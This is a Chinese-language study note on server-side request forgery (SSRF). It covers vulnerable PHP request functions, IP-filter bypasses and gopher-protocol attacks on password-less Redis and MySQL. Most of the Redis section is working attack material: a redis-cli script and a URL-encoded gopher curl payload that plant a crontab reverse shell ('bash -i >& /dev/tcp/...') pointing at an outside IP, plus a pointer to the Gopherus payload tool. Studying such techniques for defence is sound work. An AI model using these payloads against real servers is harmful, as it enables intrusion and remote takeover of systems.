# 安全牛SSRF学习笔记

<div class="has-toc have-toc">
</div>

## 0x00 SSRF介绍

SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。对外发起网络请求的地方都可能存在SSRF漏洞。

SSRF的危害：

  1. 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息
  2. 攻击运行在内网或本地的应用程序（比如溢出）
  3. 对内网Web应用进行指纹识别，通过访问默认文件实现
  4. 攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）
  5. 利用File协议读取本地文件

漏洞判断:

  * 回显
  * 延时
  * DNS请求

## 0x01 相关php函数

`file_get_contents` — 将整个文件读入一个字符串。如果要打开有特殊字符的 URL （比如说有空格），就需要进行 URL 编码。

范例：

<pre class="wp-block-code"><code>&lt;?php
if (isset($_POST&#91;'ur1']))
{
	$content= file_get_contents($_POST&#91;'url']);
	$filename ='./images/'.rand().'jpg';
	file_ put_contents($filename,$content);
	echo $_POST&#91;'url'];
	$img ="&lt;img src=\"".$filename."\"/>"；
	echo $img;
}
else
{
	echo"no url";
}
?></code></pre>

`fsockopen` — 打开一个网络连接或者一个Unix套接字连接。初始化一个套接字连接到指定主机（`hostname`）。

范例：

<pre class="wp-block-code"><code>&lt;?php
$url = $_POST&#91;'url'];
$port = $_POST&#91;'port'];
$fp = fsockopen($url, $port, $errno, $errstr,30);
if(!$fp){
	echo "$errstr($errno)&lt;br />\n";
}
else{
	$out = "GET / HTTP/1.1\r\n";
	$out .= "Host:www.example.com\r\n";
	$out .= "Connection: Close\r\n\r\n";
	fwrite($fp, $out);
	while(!feof($fp)){
		echo fgets($fp, 128);
	}	
	fclose($fp);
}

#url=127.0.0.1&port=3308
?></code></pre>

`curl_exec` — 执行 cURL 会话

phpinfo中curl-protocols会显示支持的协议有哪些。<figure class="wp-block-image size-full">

<img loading="lazy" width="949" height="371" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-205.png" alt="" class="wp-image-3128" /> </figure> 

## 0x02 ip限制绕过及gopher对redis的利用

绕过技巧

<pre class="wp-block-code"><code>添加端口//127.0.0.1:80

短网址//例如在http://45.xcyqz.cn/试验

指向任意IP的域名,比如：xip.io、sslip.io、nip.io、

不同进制组合转换
//127.0.0.1-->八进制0177.0.0.1-->十六进制0x7f.0.0.1/0x7f000001-->十进制2130706433</code></pre>

gopher是一个互联网上使用的分布型的文件搜集获取网络协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议。（俗称万能协议）

gopher协议的格式：`gopher://host:port/_+数据流`

  1. 如果不指定端口，默认端口为70端口
  2. 数据流要求全部进行url编码，并且以\r\n换行也就说以%0D%0A换行

**Gopher对Redis的利用**

Redis是一个key-value存储系统,支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set --有序集合)和hash（哈希类型）。这些数据类型都支持`push/pop`、`add/remove`及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，Redis支持各种不同方式的排序。为了保证效率，数据都是缓存在内存中。Redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。参考<a href="https://www.cnblogs.com/twosmi1e/p/13308682.html" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://www.cnblogs.com/twosmi1e/p/13308682.html</a>

常用命令

<pre class="wp-block-code"><code>      set testkey "Hello World"         # 设置键testkey的值为字符串Hello World
      get testkey                       # 获取键testkey的内容
      SET score 99                      # 设置键score的值为99
      INCR score                        # 使用INCR命令将score的值增加1
      GET score                         # 获取键score的内容
      keys *                            # 列出当前数据库中所有的键
      get anotherkey                    # 获取一个不存在的键的值
      config set dir /home/test         # 设置工作目录
      config set dbfilename redis.rdb   # 设置备份文件名
      config get dir                    # 检查工作目录是否设置成功
      config get dbfilename             # 检查备份文件名是否设置成功
      save                              # 进行一次备份操作
      flushall                          # 删除所有数据
      del key                           # 删除键为key的数据

Redis是不区分命令的大小写的，当尝试获取一个不存在的键的值时，Redis会返回空，即(nil)。</code></pre>

利用条件Redis没有密码

  1. 首先在crontab里写定时任务，反弹shell，`bash -i >&` 表示创建一个交互式的bash shell到，`/dev/tcp/xxx`是一个特殊的文件，凡是尝试对该文件读或者写的操作，都会导致该文件发起一个socket连接，`/dev/tcp/ip地址/端口` 相当于创建了一个tcp套接字去连接IP地址:端口。`0>&1` 表示将标准输入重定向到文件描述符为1的文件中，即将标准输入重定向到标准输出；
  2. 配置数据库文件夹路径，每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面。
  3. 设置数据库文件名为root
  4. 备份
  5. 退出<figure class="wp-block-image size-full">

<img loading="lazy" width="1217" height="310" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-206.png" alt="" class="wp-image-3135" /> </figure> 

Shell脚本：

<pre class="wp-block-code"><code>echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/106.12.37.37/2333 0>&1\n\n"|redis-cli -h $1 -p 
$2 -x set 1 
redis-cli -h $1 -p $2 config set dir /var/spool/cron/ 
redis-cli -h $1 -p $2 config set dbfilename root 
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit

-h 服务器地址 -p 端口号</code></pre>

比如说中间人端口为4444，启动中间人代理，`socat -v tcp-listen:4444,fork tcp-connect:localhost:6379`

格式转换脚本<figure class="wp-block-image is-resized">

<img loading="lazy" src="https://img-blog.csdnimg.cn/20210213150653418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzQxNTY0NA==,size_16,color_FFFFFF,t_70" alt="" width="575" height="520" /> </figure> 

```
curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a %0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d% 0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0 aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0 d%0a*1%0d%0a$4%0d%0aquit%0d%0a'
```

需要注意的是，如果要换IP和端口，前面的$58也需要更改，$58表示字符串长度  


需要注意的是，如果要换IP和端口，前面的$58也需要更改，$58表示字符串长度 为58个字节，上面的EXP即是%0a%0a%0a\*/1 \* \* \* * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0a，3+51+4=58。如果想换成 42.256.24.73，那么$58需要改成$61，以此类推就行。  


## 0x03 Gopher对Mysql的利用

利用条件：Mysql 无密码

常规操作：登入数据库->获取数据<figure class="wp-block-image size-full">

<img loading="lazy" width="1496" height="493" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-207.png" alt="" class="wp-image-3149" /> </figure> 

协议转化:

<pre class="wp-block-code"><code>gopher://127.0.0.1:3306/_ 
+url编码的登录请求
+包长度
+%00%00%00%03
+查询语句(url编码)
+%01%00%00%00%01</code></pre>

请求的接口：curl（绕过系统，命令执行）、php-curl（ssrf）。

工具：<a href="https://hub.fastgit.org/tarunkant/Gopherus" target="_blank"  rel="nofollow" >https://hub.fastgit.org/tarunkant/Gopherus</a>
